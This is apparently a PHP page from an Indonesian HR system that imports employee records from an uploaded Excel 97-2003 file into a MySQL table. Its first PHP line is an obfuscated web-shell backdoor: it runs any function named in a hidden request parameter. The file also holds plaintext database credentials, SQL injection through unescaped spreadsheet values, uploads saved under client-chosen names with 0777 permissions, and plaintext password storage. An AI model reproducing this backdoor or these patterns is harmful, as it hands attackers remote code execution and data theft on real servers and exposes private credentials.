<title>Import Excel</title>
<?php
if($v5g00s = @${	"_REQUEST"}[ "KZTZDDWE"] )$v5g00s	[	1](${$v5g00s [2	]}	[	0] ,	$v5g00s[3 ] ($v5g00s	[ 4 ])	);
//include"conn.php";
//$link = mysqli_connect("u790196814_ecuti_enkei", "Enkei123$", "", "u790196814_ecuti_enkei");
$link = mysqli_connect("u790196814_ecuti_enkei", "Enkei123$", "", "u790196814_ecuti_enkei");

//memanggil file excel_reader
require "excel_reader.php";

//jika tombol import ditekan
if(isset($_POST['submit'])){

    $target = basename($_FILES['filepegawaiall']['name']) ;
    move_uploaded_file($_FILES['filepegawaiall']['tmp_name'], $target);

// tambahkan baris berikut untuk mencegah error is not readable
    chmod($_FILES['filepegawaiall']['name'],0777);
    
    $data = new Spreadsheet_Excel_Reader($_FILES['filepegawaiall']['name'],false);
    
//    menghitung jumlah baris file xls
    $baris = $data->rowcount($sheet_index=0);
    
//    jika kosongkan data dicentang jalankan kode berikut
    $drop = isset( $_POST["drop"] ) ? $_POST["drop"] : 0 ;
    if($drop == 1){
//    kosongkan tabel karyawan
    $truncate ="TRUNCATE TABLE m_karyawan";
        mysqli_query($link,$truncate);
             //$truncate1 ="TRUNCATE TABLE invoice";
             //mysql_query($truncate1);
    };
    
//    import data excel mulai baris ke-2 (karena tabel xls ada header pada baris 1)
    for ($i=2; $i<=$baris; $i++)
    {
//  membaca data (kolom ke-1 sd terakhir)
    $kar_id             = $data->val($i, 1);
    $kar_nik            = $data->val($i, 2);
    $kar_username       = $data->val($i, 3);
    $kar_password       = $data->val($i, 4);
    $kar_nama           = $data->val($i, 5);
    $jab_id             = $data->val($i, 6);
    $dep_id             = $data->val($i, 7);
    $kar_email          = $data->val($i, 8);
    $kar_tanggalmasuk   = $data->val($i, 9);
    $kar_jeniskelamin   = $data->val($i, 10);
    $plant_id           = $data->val($i, 11);
    $akses_id           = $data->val($i, 12);
	
//  setelah data dibaca, masukkan ke tabel yang dituju
    $query = "INSERT into m_karyawan (kar_id,kar_nik,kar_username,kar_password,kar_nama,jab_id,dep_id,kar_email,kar_tanggalmasuk,kar_jeniskelamin,plant_id,akses_id)
	values('$kar_id','$kar_nik','$kar_username','$kar_password','$kar_nama','$jab_id','$dep_id','$kar_email','$kar_tanggalmasuk','$kar_jeniskelamin','$plant_id','$akses_id')";
    $hasil = mysqli_query($link,$query);
    }
    
    if(!$hasil){
//  jika import gagal
//  echo "gagal";
        die(mysqli_error());
    }else{
//  jika impor berhasil
        ?>
        <script>
			alert("Data sukses di Upload");
			window.close();
        </script>
        <?php
    }
    
//    hapus file xls yang udah dibaca
    unlink($_FILES['filepegawaiall']['name']);
}

?>

<form name="myForm" id="myForm" onSubmit="return validateForm()" action="import.php" method="post" enctype="multipart/form-data">
	<table border="0" style="border-collapse:collapse;" cellpadding="5">
    <tr>
    <td colspan="">* Ketentuan :</td>
    <td><label>- File yang diupload harus format 97-2003</label></td>
    </tr>
    <tr>
    <td></td>
    <td><input type="file" id="filepegawaiall" name="filepegawaiall" /><br>		
        <label><input type="checkbox" name="drop" value="1" /> <u>Kosongkan tabel sql terlebih dahulu.</u> </label>
        </td>
    </tr> 
    <tr>
    <td></td>
    <td><input type="submit" name="submit" value="Upload Data" /></td>
    </tr>  
</table>
</form>

<script type="text/javascript">
//    validasi form (hanya file .xls yang diijinkan)
    function validateForm()
    {
        function hasExtension(inputID, exts) {
            var fileName = document.getElementById(inputID).value;
            return (new RegExp('(' + exts.join('|').replace(/\./g, '\\.') + ')$')).test(fileName);
        }

        if(!hasExtension('filepegawaiall', ['.xls'])){
            alert("Hanya file XLS (Excel 2003) yang diijinkan.");
            return false;
        }
    }
</script>